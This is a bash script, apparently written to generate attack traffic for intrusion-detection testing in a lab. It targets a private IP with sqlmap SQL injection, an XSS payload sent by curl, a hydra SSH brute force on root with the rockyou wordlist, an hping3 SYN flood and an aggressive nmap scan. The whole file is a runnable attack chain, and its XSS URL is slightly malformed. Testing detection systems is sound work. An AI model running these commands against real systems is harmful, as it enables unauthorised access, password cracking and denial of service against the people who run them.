#!/bin/bash

TARGET_IP="10.1.107.133"
TARGET_WEB="http://$TARGET_IP/vuln.php?id=1"

echo "Starting attacks on $TARGET_IP..."

# SQL Injection
echo "[+] Running SQL Injection Attack..."
sqlmap -u "$TARGET_WEB" --batch --dbs

# XSS Attack
echo "[+] Running XSS Attack..."
curl "$TARGET_WEB?id=<script>alert('XSS')</script>"

# SSH Brute Force
echo "[+] Running SSH Brute Force Attack..."
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP

# DDoS Attack Simulation
echo "[+] Running SYN Flood Attack..."
hping3 -S --flood -V -p 80 $TARGET_IP

# Port Scanning
echo "[+] Running Port Scan..."
nmap -p 21,22,23,25,53,80,110,443,445,3389 -A $TARGET_IP

echo "Attacks executed. Check IDS logs!"
